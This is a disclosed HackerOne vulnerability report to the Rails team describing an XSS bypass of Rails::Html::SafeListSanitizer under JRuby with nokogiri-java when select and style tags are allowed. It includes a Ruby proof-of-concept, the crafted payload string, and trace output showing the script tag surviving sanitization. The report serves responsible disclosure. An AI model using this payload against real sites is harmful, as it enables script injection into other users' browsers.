# Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag

## Report Details
- **Report ID**: 1530898
- **URL**: https://hackerone.com/reports/1530898
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-04-05T07:34:03.681Z
- **Disclosed**: 2022-06-14T03:49:29.284Z

## Reporter
- **Username**: windshock
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
It seems to be a problem caused by a difference between the nokogiri java implementation and the ruby implementation.
It seems to be an ambiguous case as to whether to do it with nokogiri or have rails-html-sanitizer defend it.

jruby9.3.3.0 (nokogiri java), use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag
code
```
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

result
```
input: <select<style/>W<xmp<script>alert(1)</script>
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;
scrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>
scrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>
scrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>
output: <select><style>W<script>alert(1)</script></style></select>
```

## Impact

It is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.

## Attachments
No attachments
